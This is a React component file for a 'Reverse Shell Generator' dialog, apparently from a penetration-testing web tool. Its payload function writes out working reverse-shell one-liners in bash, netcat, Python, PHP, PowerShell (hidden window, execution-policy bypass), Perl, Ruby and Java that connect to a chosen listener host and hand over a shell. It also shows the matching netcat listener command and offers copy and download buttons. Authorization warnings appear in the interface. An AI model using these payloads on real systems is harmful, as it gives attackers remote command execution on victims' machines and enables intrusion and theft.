import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useToast } from '@/hooks/use-toast';
import { 
  Terminal, 
  Copy, 
  Shield,
  AlertTriangle,
  ExternalLink,
  Download
} from 'lucide-react';

interface ReverseShellGeneratorProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const ReverseShellGenerator = ({ open, onOpenChange }: ReverseShellGeneratorProps) => {
  const [config, setConfig] = useState({
    type: 'bash',
    host: '',
    port: '4444'
  });
  const [generatedPayload, setGeneratedPayload] = useState('');
  const { toast } = useToast();

  const payloadTypes = [
    { id: 'bash', name: 'Bash', description: 'Unix/Linux bash reverse shell' },
    { id: 'nc', name: 'Netcat', description: 'Netcat reverse shell' },
    { id: 'python', name: 'Python', description: 'Python reverse shell' },
    { id: 'php', name: 'PHP', description: 'PHP reverse shell' },
    { id: 'powershell', name: 'PowerShell', description: 'Windows PowerShell reverse shell' },
    { id: 'perl', name: 'Perl', description: 'Perl reverse shell' },
    { id: 'ruby', name: 'Ruby', description: 'Ruby reverse shell' },
    { id: 'java', name: 'Java', description: 'Java reverse shell' }
  ];

  const generatePayload = () => {
    if (!config.host || !config.port) {
      toast({
        title: "Configuration Error",
        description: "Please provide host and port",
        variant: "destructive"
      });
      return;
    }

    let payload = '';
    
    switch (config.type) {
      case 'bash':
        payload = `bash -i >& /dev/tcp/${config.host}/${config.port} 0>&1`;
        break;
      case 'nc':
        payload = `nc -e /bin/sh ${config.host} ${config.port}`;
        break;
      case 'python':
        payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${config.host}",${config.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
        break;
      case 'php':
        payload = `php -r '$sock=fsockopen("${config.host}",${config.port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
        break;
      case 'powershell':
        payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${config.host}",${config.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
        break;
      case 'perl':
        payload = `perl -e 'use Socket;$i="${config.host}";$p=${config.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
        break;
      case 'ruby':
        payload = `ruby -rsocket -e'f=TCPSocket.open("${config.host}",${config.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
        break;
      case 'java':
        payload = `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${config.host}/${config.port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor()`;
        break;
    }

    setGeneratedPayload(payload);
    
    toast({
      title: "Payload Generated",
      description: `${payloadTypes.find(p => p.id === config.type)?.name} reverse shell generated`,
    });
  };

  const copyPayload = () => {
    navigator.clipboard.writeText(generatedPayload);
    toast({
      title: "Copied!",
      description: "Payload copied to clipboard",
    });
  };

  const downloadPayload = () => {
    const blob = new Blob([generatedPayload], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `reverse_shell_${config.type}_${config.host}_${config.port}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: "Payload Downloaded",
      description: "Reverse shell payload saved to file",
    });
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="flex items-center space-x-2">
            <Terminal className="w-5 h-5" />
            <span>Reverse Shell Generator</span>
          </DialogTitle>
          <DialogDescription>
            Generate reverse shell payloads for authorized penetration testing
          </DialogDescription>
        </DialogHeader>
        
        <Alert className="border-destructive/50 text-destructive dark:border-destructive [&>svg]:text-destructive">
          <AlertTriangle className="h-4 w-4" />
          <AlertDescription>
            <strong>WARNING:</strong> Use reverse shells only on systems you own or have explicit written authorization to test. 
            Unauthorized access to computer systems is illegal and may result in criminal prosecution.
          </AlertDescription>
        </Alert>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <Card>
            <CardHeader>
              <CardTitle>Configuration</CardTitle>
              <CardDescription>Configure your reverse shell parameters</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="payload-type">Payload Type</Label>
                <Select value={config.type} onValueChange={(value) => setConfig({...config, type: value})}>
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {payloadTypes.map((type) => (
                      <SelectItem key={type.id} value={type.id}>
                        <div>
                          <div className="font-medium">{type.name}</div>
                          <div className="text-xs text-muted-foreground">{type.description}</div>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <Label htmlFor="listener-host">Listener Host (Your IP)</Label>
                <Input
                  id="listener-host"
                  placeholder="192.168.1.100"
                  value={config.host}
                  onChange={(e) => setConfig({...config, host: e.target.value})}
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="listener-port">Listener Port</Label>
                <Input
                  id="listener-port"
                  placeholder="4444"
                  value={config.port}
                  onChange={(e) => setConfig({...config, port: e.target.value})}
                />
              </div>

              <Button onClick={generatePayload} className="w-full">
                <Terminal className="w-4 h-4 mr-2" />
                Generate Payload
              </Button>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Generated Payload</CardTitle>
              <CardDescription>Copy or download the generated reverse shell</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {generatedPayload ? (
                <>
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <Label>Payload</Label>
                      <div className="flex space-x-2">
                        <Button variant="outline" size="sm" onClick={copyPayload}>
                          <Copy className="w-4 h-4 mr-1" />
                          Copy
                        </Button>
                        <Button variant="outline" size="sm" onClick={downloadPayload}>
                          <Download className="w-4 h-4 mr-1" />
                          Download
                        </Button>
                      </div>
                    </div>
                    <Textarea
                      value={generatedPayload}
                      readOnly
                      className="font-mono text-sm min-h-[120px] bg-muted"
                      placeholder="Generated payload will appear here..."
                    />
                  </div>
                  
                  <div className="p-4 bg-muted/50 rounded-lg">
                    <h4 className="font-semibold mb-2 flex items-center">
                      <Shield className="w-4 h-4 mr-2" />
                      Listener Setup
                    </h4>
                    <p className="text-sm text-muted-foreground mb-2">
                      Set up a listener on your attacking machine:
                    </p>
                    <code className="block bg-background p-2 rounded font-mono text-sm">
                      nc -lvnp {config.port}
                    </code>
                  </div>
                </>
              ) : (
                <div className="text-center py-8">
                  <Terminal className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
                  <p className="text-muted-foreground">Configure and generate a payload</p>
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Security Notes</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
              <div>
                <h4 className="font-semibold text-destructive mb-2">⚠️ Legal Requirements</h4>
                <ul className="space-y-1 text-muted-foreground">
                  <li>• Written authorization required</li>
                  <li>• Only test owned systems</li>
                  <li>• Respect scope limitations</li>
                  <li>• Follow responsible disclosure</li>
                </ul>
              </div>
              <div>
                <h4 className="font-semibold text-primary mb-2">🔒 Best Practices</h4>
                <ul className="space-y-1 text-muted-foreground">
                  <li>• Use encrypted channels when possible</li>
                  <li>• Clean up after testing</li>
                  <li>• Document all activities</li>
                  <li>• Report findings responsibly</li>
                </ul>
              </div>
            </div>
          </CardContent>
        </Card>
      </DialogContent>
    </Dialog>
  );
};

export default ReverseShellGenerator;